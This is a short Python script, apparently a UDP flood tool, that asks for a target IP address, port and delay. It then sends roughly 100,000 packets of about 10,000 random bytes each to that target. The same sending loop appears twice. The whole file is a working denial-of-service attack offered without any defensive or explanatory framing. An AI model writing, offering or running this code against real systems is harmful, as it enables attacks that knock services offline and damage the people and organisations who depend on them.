import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Target IP: ")
port = int(input("Target Port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)


for i in range(1, 100*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)